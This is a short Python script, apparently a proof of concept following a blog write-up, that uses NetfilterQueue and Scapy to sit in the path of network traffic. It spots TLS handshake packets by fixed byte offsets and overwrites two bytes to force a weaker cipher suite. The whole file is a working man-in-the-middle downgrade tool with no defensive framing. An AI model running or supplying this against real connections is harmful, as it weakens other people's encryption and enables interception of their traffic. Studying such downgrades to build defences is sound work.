#!/usr/bin/python
#
# With many thanks to Ludovic Barman for their great write-up.
# https://lbarman.ch/blog/downgrade-tls/
#

from netfilterqueue import NetfilterQueue
from scapy.all import *

nfQueueID         = 0
maxPacketsToStore = 100

def packetReceived(pkt):
  print("Accepted a new packet...")
  ip = IP(pkt.get_payload())
  if not ip.haslayer("Raw"):
    pkt.accept();
  else:
    tcpPayload = ip["Raw"].load;
    if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[46] == 0x00 and tcpPayload[47] == 0x35:
      # we located the Handshake
      msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it
      msgBytes2 = [b for b in msgBytes]
      msgBytes2[112] = 0x00
      msgBytes2[113] = 0x2F
      pkt.set_payload(bytes(msgBytes2))
      pkt.accept()
    else:
      pkt.accept();

print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, packetReceived, maxPacketsToStore) # binds to queue 0, use handler "packetReceived()"
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()

